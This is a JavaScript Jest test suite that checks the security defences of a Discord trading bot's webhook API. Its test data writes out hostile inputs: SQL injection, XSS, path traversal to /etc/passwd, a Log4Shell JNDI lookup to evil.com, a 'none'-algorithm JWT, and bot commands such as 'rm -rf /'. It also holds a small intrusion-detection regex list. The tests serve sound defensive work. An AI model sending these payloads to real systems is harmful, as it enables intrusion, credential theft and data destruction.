/**
 * Security Validation Tests
 * Tests security measures and vulnerability protections
 */

const request = require('supertest');
const crypto = require('crypto');
const jwt = require('jsonwebtoken');
const TradingBot = require('../../src/bot/index');
const SecurityValidator = require('../../src/utils/security');
const RateLimit = require('../../src/utils/rateLimit');
const logger = require('../../src/utils/logger');

// Mock security dependencies
jest.mock('../../src/utils/logger');

const mockDiscordClient = {
    user: { tag: 'SecurityTestBot#1234' },
    guilds: { cache: { size: 1 } },
    users: { cache: { size: 10 } },
    ws: { ping: 50 },
    readyAt: new Date(),
    channels: {
        cache: new Map([
            ['secure-channel', {
                id: 'secure-channel',
                send: jest.fn().mockResolvedValue({ id: 'msg123' })
            }]
        ])
    }
};

describe('Security Validation Tests', () => {
    let app;
    let server;
    let bot;

    beforeAll(async () => {
        bot = new TradingBot();
        bot.client = mockDiscordClient;
        app = bot.app;
        server = app.listen(0);
    });

    afterAll(async () => {
        if (server) {
            await new Promise(resolve => server.close(resolve));
        }
    });

    beforeEach(() => {
        jest.clearAllMocks();
    });

    describe('Webhook Signature Validation', () => {
        const webhookSecret = 'test-webhook-secret-key';
        const validPayload = {
            symbol: 'EURUSD',
            action: 'BUY',
            price: 1.0850,
            timestamp: Date.now()
        };

        const generateValidSignature = (payload, secret) => {
            const payloadString = JSON.stringify(payload);
            return crypto
                .createHmac('sha256', secret)
                .update(payloadString)
                .digest('hex');
        };

        test('should validate correct webhook signatures', async () => {
            const signature = generateValidSignature(validPayload, webhookSecret);

            const response = await request(app)
                .post('/webhook')
                .set('X-Signature', `sha256=${signature}`)
                .set('Content-Type', 'application/json')
                .send(validPayload);

            // Should accept valid signature
            expect([200, 201]).toContain(response.status);
        });

        test('should reject invalid webhook signatures', async () => {
            const invalidSignature = 'invalid-signature-hash';

            const response = await request(app)
                .post('/webhook')
                .set('X-Signature', `sha256=${invalidSignature}`)
                .set('Content-Type', 'application/json')
                .send(validPayload);

            expect(response.status).toBe(401);
            expect(response.body.error).toContain('Invalid signature');
        });

        test('should reject webhooks without signatures', async () => {
            const response = await request(app)
                .post('/webhook')
                .set('Content-Type', 'application/json')
                .send(validPayload);

            // Depending on security configuration, may require signature
            if (response.status === 401) {
                expect(response.body.error).toContain('signature');
            }
        });

        test('should handle signature timing attacks', async () => {
            const shortSignature = 'short';
            const longSignature = 'very-long-signature-that-takes-more-time-to-compare';

            const shortStart = Date.now();
            await request(app)
                .post('/webhook')
                .set('X-Signature', `sha256=${shortSignature}`)
                .send(validPayload);
            const shortEnd = Date.now();

            const longStart = Date.now();
            await request(app)
                .post('/webhook')
                .set('X-Signature', `sha256=${longSignature}`)
                .send(validPayload);
            const longEnd = Date.now();

            const shortTime = shortEnd - shortStart;
            const longTime = longEnd - longStart;

            // Time difference should be minimal (constant-time comparison)
            const timeDifference = Math.abs(longTime - shortTime);
            expect(timeDifference).toBeLessThan(50); // Less than 50ms difference
        });
    });

    describe('Input Sanitization', () => {
        test('should sanitize SQL injection attempts', async () => {
            const maliciousPayload = {
                symbol: "EURUSD'; DROP TABLE users; --",
                action: 'BUY',
                price: 1.0850,
                comment: "'; DELETE FROM orders WHERE '1'='1"
            };

            const response = await request(app)
                .post('/webhook')
                .set('Content-Type', 'application/json')
                .send(maliciousPayload);

            // Should sanitize or reject malicious input
            if (response.status === 200) {
                // Check that dangerous SQL is sanitized
                expect(response.body.processedData?.symbol).not.toContain("'; DROP TABLE");
                expect(response.body.processedData?.comment).not.toContain("DELETE FROM");
            } else {
                expect(response.status).toBe(400);
                expect(response.body.error).toContain('Invalid input');
            }
        });

        test('should sanitize XSS attempts', async () => {
            const xssPayload = {
                symbol: 'EURUSD',
                action: 'BUY',
                price: 1.0850,
                message: '<script>alert("XSS")</script>',
                comment: '"><script>document.cookie="hacked"</script>',
                strategy: 'javascript:alert("XSS")'
            };

            const response = await request(app)
                .post('/webhook')
                .set('Content-Type', 'application/json')
                .send(xssPayload);

            if (response.status === 200) {
                // Check that script tags and javascript: are sanitized
                const processedData = response.body.processedData || {};
                expect(processedData.message).not.toContain('<script>');
                expect(processedData.comment).not.toContain('<script>');
                expect(processedData.strategy).not.toContain('javascript:');
            } else {
                expect(response.status).toBe(400);
            }
        });

        test('should sanitize command injection attempts', async () => {
            const commandInjectionPayload = {
                symbol: 'EURUSD',
                action: 'BUY',
                price: 1.0850,
                file: '../../etc/passwd',
                command: 'cat /etc/passwd',
                path: '../../../windows/system32/config/sam'
            };

            const response = await request(app)
                .post('/webhook')
                .set('Content-Type', 'application/json')
                .send(commandInjectionPayload);

            if (response.status === 200) {
                const processedData = response.body.processedData || {};
                expect(processedData.file).not.toContain('../');
                expect(processedData.command).not.toContain('/etc/passwd');
                expect(processedData.path).not.toContain('../');
            } else {
                expect(response.status).toBe(400);
            }
        });

        test('should handle extremely large payloads', async () => {
            const largePayload = {
                symbol: 'EURUSD',
                action: 'BUY',
                price: 1.0850,
                data: 'A'.repeat(10 * 1024 * 1024) // 10MB string
            };

            const response = await request(app)
                .post('/webhook')
                .set('Content-Type', 'application/json')
                .send(largePayload);

            // Should reject payloads that exceed size limits
            expect(response.status).toBe(413); // Payload Too Large
        });

        test('should validate input data types', async () => {
            const invalidTypePayload = {
                symbol: 123, // Should be string
                action: true, // Should be string
                price: 'not-a-number', // Should be number
                timestamp: 'invalid-date', // Should be valid date
                volume: -1000 // Should be positive
            };

            const response = await request(app)
                .post('/webhook')
                .set('Content-Type', 'application/json')
                .send(invalidTypePayload);

            expect(response.status).toBe(400);
            expect(response.body.error).toContain('Invalid data type');
        });
    });

    describe('Rate Limiting', () => {
        test('should enforce rate limits per IP', async () => {
            const requests = [];
            const maxRequests = 100; // Assume rate limit

            // Send requests rapidly from same IP
            for (let i = 0; i < maxRequests + 10; i++) {
                requests.push(
                    request(app)
                        .post('/webhook')
                        .set('X-Forwarded-For', '192.168.1.100')
                        .send({
                            symbol: 'EURUSD',
                            action: 'BUY',
                            price: 1.0850 + (i * 0.0001)
                        })
                );
            }

            const responses = await Promise.allSettled(requests);
            const rateLimitedResponses = responses.filter(
                r => r.value?.status === 429
            );

            expect(rateLimitedResponses.length).toBeGreaterThan(0);
        });

        test('should enforce rate limits per user/token', async () => {
            const userToken = 'user-token-123';
            const requests = [];

            for (let i = 0; i < 50; i++) {
                requests.push(
                    request(app)
                        .post('/webhook')
                        .set('Authorization', `Bearer ${userToken}`)
                        .send({
                            symbol: 'EURUSD',
                            action: 'BUY',
                            price: 1.0850
                        })
                );
            }

            const responses = await Promise.allSettled(requests);
            const rateLimitedCount = responses.filter(
                r => r.value?.status === 429
            ).length;

            expect(rateLimitedCount).toBeGreaterThan(0);
        });

        test('should handle rate limit bypass attempts', async () => {
            const bypassAttempts = [
                { 'X-Forwarded-For': '127.0.0.1' },
                { 'X-Real-IP': '10.0.0.1' },
                { 'X-Originating-IP': '172.16.0.1' },
                { 'Client-IP': '192.168.1.1' },
                { 'True-Client-IP': '203.0.113.1' }
            ];

            const requests = [];

            bypassAttempts.forEach((headers, index) => {
                for (let i = 0; i < 25; i++) {
                    requests.push(
                        request(app)
                            .post('/webhook')
                            .set(headers)
                            .send({
                                symbol: 'EURUSD',
                                action: 'BUY',
                                price: 1.0850 + (index * 0.001) + (i * 0.0001)
                            })
                    );
                }
            });

            const responses = await Promise.allSettled(requests);
            const rateLimitedCount = responses.filter(
                r => r.value?.status === 429
            ).length;

            // Should still enforce rate limits despite header manipulation
            expect(rateLimitedCount).toBeGreaterThan(10);
        });
    });

    describe('Authentication and Authorization', () => {
        const jwtSecret = 'test-jwt-secret';

        const generateTestToken = (payload, secret = jwtSecret, expiresIn = '1h') => {
            return jwt.sign(payload, secret, { expiresIn });
        };

        test('should validate JWT tokens', async () => {
            const validToken = generateTestToken({
                userId: 'user123',
                permissions: ['webhook:write', 'analysis:read']
            });

            const response = await request(app)
                .post('/webhook')
                .set('Authorization', `Bearer ${validToken}`)
                .send({
                    symbol: 'EURUSD',
                    action: 'BUY',
                    price: 1.0850
                });

            // Should accept valid token
            expect([200, 201]).toContain(response.status);
        });

        test('should reject expired tokens', async () => {
            const expiredToken = generateTestToken(
                { userId: 'user123' },
                jwtSecret,
                '-1h' // Expired 1 hour ago
            );

            const response = await request(app)
                .post('/webhook')
                .set('Authorization', `Bearer ${expiredToken}`)
                .send({
                    symbol: 'EURUSD',
                    action: 'BUY',
                    price: 1.0850
                });

            expect(response.status).toBe(401);
            expect(response.body.error).toContain('expired');
        });

        test('should reject tokens with invalid signatures', async () => {
            const invalidToken = generateTestToken(
                { userId: 'user123' },
                'wrong-secret'
            );

            const response = await request(app)
                .post('/webhook')
                .set('Authorization', `Bearer ${invalidToken}`)
                .send({
                    symbol: 'EURUSD',
                    action: 'BUY',
                    price: 1.0850
                });

            expect(response.status).toBe(401);
            expect(response.body.error).toContain('Invalid token');
        });

        test('should enforce permission-based access', async () => {
            const limitedToken = generateTestToken({
                userId: 'user123',
                permissions: ['analysis:read'] // Missing webhook:write
            });

            const response = await request(app)
                .post('/webhook')
                .set('Authorization', `Bearer ${limitedToken}`)
                .send({
                    symbol: 'EURUSD',
                    action: 'BUY',
                    price: 1.0850
                });

            expect(response.status).toBe(403);
            expect(response.body.error).toContain('Insufficient permissions');
        });

        test('should handle token injection attacks', async () => {
            const maliciousTokens = [
                'Bearer eyJhbGciOiJub25lIn0.eyJ1c2VySWQiOiJhZG1pbiJ9.', // None algorithm
                'Bearer ../../../etc/passwd',
                'Bearer <script>alert("xss")</script>',
                'Bearer ${jndi:ldap://evil.com/a}'
            ];

            for (const maliciousToken of maliciousTokens) {
                const response = await request(app)
                    .post('/webhook')
                    .set('Authorization', maliciousToken)
                    .send({
                        symbol: 'EURUSD',
                        action: 'BUY',
                        price: 1.0850
                    });

                expect(response.status).toBe(401);
            }
        });
    });

    describe('Discord Security', () => {
        test('should validate Discord user permissions', async () => {
            const mockMessage = {
                id: 'msg123',
                content: '!admin reset database',
                author: {
                    id: 'user123',
                    username: 'TestUser',
                    bot: false
                },
                member: {
                    permissions: {
                        has: jest.fn().mockReturnValue(false) // No admin permissions
                    }
                },
                channel: mockDiscordClient.channels.cache.get('secure-channel'),
                guild: { id: 'guild123' }
            };

            // Should reject admin commands from non-admin users
            await bot.commandHandler.handleMessage(mockMessage);

            expect(mockMessage.channel.send).toHaveBeenCalledWith(
                expect.objectContaining({
                    embeds: expect.arrayContaining([
                        expect.objectContaining({
                            title: expect.stringContaining('Permission Denied')
                        })
                    ])
                })
            );
        });

        test('should prevent bot command injection', async () => {
            const maliciousCommands = [
                '!eval process.exit()',
                '!exec rm -rf /',
                '!command $(cat /etc/passwd)',
                '!setup `rm database.db`'
            ];

            for (const maliciousCommand of maliciousCommands) {
                const mockMessage = {
                    id: 'msg123',
                    content: maliciousCommand,
                    author: { id: 'user123', bot: false },
                    channel: mockDiscordClient.channels.cache.get('secure-channel'),
                    guild: { id: 'guild123' }
                };

                await bot.commandHandler.handleMessage(mockMessage);

                // Should reject or sanitize malicious commands
                expect(mockMessage.channel.send).toHaveBeenCalledWith(
                    expect.objectContaining({
                        embeds: expect.arrayContaining([
                            expect.objectContaining({
                                title: expect.stringMatching(/Error|Invalid|Denied/)
                            })
                        ])
                    })
                );
            }
        });

        test('should handle Discord rate limiting attacks', async () => {
            const channel = mockDiscordClient.channels.cache.get('secure-channel');
            const rapidMessages = [];

            // Simulate rapid message sending
            for (let i = 0; i < 20; i++) {
                rapidMessages.push({
                    id: `msg${i}`,
                    content: `!ping ${i}`,
                    author: { id: 'user123', bot: false },
                    channel: channel,
                    guild: { id: 'guild123' },
                    createdTimestamp: Date.now() + i
                });
            }

            // Process messages rapidly
            for (const message of rapidMessages) {
                await bot.commandHandler.handleMessage(message);
            }

            // Should implement internal rate limiting
            const sendCalls = channel.send.mock.calls;
            const rateLimitResponses = sendCalls.filter(call =>
                call[0]?.embeds?.[0]?.title?.includes('Rate Limited') ||
                call[0]?.embeds?.[0]?.title?.includes('Cooldown')
            );

            expect(rateLimitResponses.length).toBeGreaterThan(0);
        });
    });

    describe('Data Privacy and Protection', () => {
        test('should not log sensitive information', async () => {
            const sensitivePayload = {
                symbol: 'EURUSD',
                action: 'BUY',
                price: 1.0850,
                apiKey: 'secret-api-key',
                password: 'user-password',
                token: 'sensitive-token',
                creditCard: '4111111111111111'
            };

            await request(app)
                .post('/webhook')
                .send(sensitivePayload);

            // Check that sensitive data is not logged
            const logCalls = logger.info.mock.calls.concat(logger.debug.mock.calls);

            logCalls.forEach(call => {
                const logMessage = JSON.stringify(call);
                expect(logMessage).not.toContain('secret-api-key');
                expect(logMessage).not.toContain('user-password');
                expect(logMessage).not.toContain('sensitive-token');
                expect(logMessage).not.toContain('4111111111111111');
            });
        });

        test('should sanitize error messages', async () => {
            // Simulate database error with sensitive info
            const sensitiveError = new Error('Connection failed to postgres://user:password@db:5432/trading');

            const response = await request(app)
                .post('/webhook')
                .send({ invalid: 'data' });

            if (response.status === 500) {
                // Error message should not contain sensitive database connection info
                expect(response.body.error).not.toContain('password');
                expect(response.body.error).not.toContain('postgres://');
                expect(response.body.error).not.toContain(':5432');
            }
        });

        test('should handle PII data correctly', async () => {
            const piiData = {
                symbol: 'EURUSD',
                action: 'BUY',
                price: 1.0850,
                userEmail: 'user@example.com',
                phoneNumber: '+1234567890',
                address: '123 Main St, City, State 12345'
            };

            const response = await request(app)
                .post('/webhook')
                .send(piiData);

            if (response.status === 200) {
                // Should either reject PII or sanitize it
                const processedData = response.body.processedData || {};

                if (processedData.userEmail) {
                    expect(processedData.userEmail).toMatch(/^\*+@[^@]+$/);
                }
                if (processedData.phoneNumber) {
                    expect(processedData.phoneNumber).toMatch(/^\*+\d{4}$/);
                }
                if (processedData.address) {
                    expect(processedData.address).toContain('***');
                }
            }
        });
    });

    describe('Network Security', () => {
        test('should enforce HTTPS in production', async () => {
            // Test HTTP redirect to HTTPS
            const response = await request(app)
                .get('/health')
                .set('X-Forwarded-Proto', 'http');

            // Should redirect to HTTPS in production
            if (process.env.NODE_ENV === 'production') {
                expect([301, 302]).toContain(response.status);
                expect(response.headers.location).toMatch(/^https:/);
            }
        });

        test('should set secure headers', async () => {
            const response = await request(app).get('/health');

            // Check security headers
            expect(response.headers['x-content-type-options']).toBe('nosniff');
            expect(response.headers['x-frame-options']).toBe('DENY');
            expect(response.headers['x-xss-protection']).toBe('1; mode=block');

            if (process.env.NODE_ENV === 'production') {
                expect(response.headers['strict-transport-security']).toBeDefined();
            }
        });

        test('should handle CORS correctly', async () => {
            const response = await request(app)
                .options('/webhook')
                .set('Origin', 'https://malicious-site.com');

            // Should have proper CORS configuration
            expect(response.headers['access-control-allow-origin']).not.toBe('*');
        });

        test('should prevent host header injection', async () => {
            const maliciousHosts = [
                'evil.com',
                'localhost:8080#evil.com',
                'legitimate.com@evil.com',
                '127.0.0.1:80/evil.com'
            ];

            for (const maliciousHost of maliciousHosts) {
                const response = await request(app)
                    .get('/health')
                    .set('Host', maliciousHost);

                // Should reject or sanitize malicious host headers
                expect(response.status).not.toBe(200);
            }
        });
    });

    describe('Vulnerability Scanning', () => {
        test('should be protected against common vulnerabilities', async () => {
            const vulnerabilityTests = [
                // Directory traversal
                { path: '/../../etc/passwd', expectedStatus: 404 },
                { path: '/webhook/../admin', expectedStatus: 404 },
                { path: '/health/..\\..\\windows\\system32', expectedStatus: 404 },

                // Server-side includes
                { path: '/health<!--#exec cmd="cat /etc/passwd"-->', expectedStatus: 404 },

                // NULL byte injection
                { path: '/health%00.php', expectedStatus: 404 }
            ];

            for (const test of vulnerabilityTests) {
                const response = await request(app).get(test.path);
                expect(response.status).toBe(test.expectedStatus);
            }
        });

        test('should handle HTTP method tampering', async () => {
            const methods = ['PUT', 'DELETE', 'PATCH', 'TRACE', 'CONNECT'];

            for (const method of methods) {
                const response = await request(app)[method.toLowerCase()]?.('/webhook') ||
                                await request(app).get('/webhook').set('X-HTTP-Method-Override', method);

                // Should reject unsupported methods
                expect([405, 404]).toContain(response.status);
            }
        });

        test('should validate content-length header', async () => {
            const response = await request(app)
                .post('/webhook')
                .set('Content-Length', '999999999') // Extremely large
                .send({ small: 'payload' });

            // Should detect content-length mismatch
            expect([400, 413]).toContain(response.status);
        });
    });

    describe('Security Monitoring and Logging', () => {
        test('should log security events', async () => {
            // Trigger security event (e.g., invalid signature)
            await request(app)
                .post('/webhook')
                .set('X-Signature', 'invalid-signature')
                .send({ symbol: 'EURUSD', action: 'BUY' });

            // Should log security violation
            expect(logger.warn).toHaveBeenCalledWith(
                expect.stringContaining('Security violation'),
                expect.objectContaining({
                    type: 'invalid_signature',
                    ip: expect.any(String)
                })
            );
        });

        test('should detect and log suspicious patterns', async () => {
            const suspiciousRequests = [
                { symbol: '../../../etc/passwd', action: 'BUY' },
                { symbol: 'EURUSD', action: '<script>alert(1)</script>' },
                { symbol: 'EURUSD', action: 'BUY', price: -999999 }
            ];

            for (const payload of suspiciousRequests) {
                await request(app)
                    .post('/webhook')
                    .send(payload);
            }

            // Should detect and log suspicious patterns
            expect(logger.warn).toHaveBeenCalledWith(
                expect.stringContaining('Suspicious activity detected'),
                expect.any(Object)
            );
        });

        test('should implement intrusion detection', async () => {
            const intrusionDetector = {
                analyzeRequest: jest.fn().mockImplementation((req) => {
                    const suspiciousPatterns = [
                        /union.*select/i,
                        /script.*src/i,
                        /\.\.\//,
                        /etc\/passwd/,
                        /cmd\.exe/i
                    ];

                    const requestString = JSON.stringify(req.body) + req.url;
                    return suspiciousPatterns.some(pattern => pattern.test(requestString));
                }),

                trackFailedAttempts: jest.fn(),

                shouldBlock: jest.fn().mockImplementation((ip, attempts) => {
                    return attempts > 5; // Block after 5 failed attempts
                })
            };

            const maliciousRequest = {
                symbol: "EURUSD'; DROP TABLE users; --",
                action: 'BUY'
            };

            const isSuspicious = intrusionDetector.analyzeRequest({
                body: maliciousRequest,
                url: '/webhook'
            });

            expect(isSuspicious).toBe(true);

            if (isSuspicious) {
                intrusionDetector.trackFailedAttempts('192.168.1.100');

                if (intrusionDetector.shouldBlock('192.168.1.100', 6)) {
                    expect(logger.error).toHaveBeenCalledWith(
                        expect.stringContaining('IP blocked due to suspicious activity'),
                        expect.objectContaining({
                            ip: '192.168.1.100'
                        })
                    );
                }
            }
        });
    });
});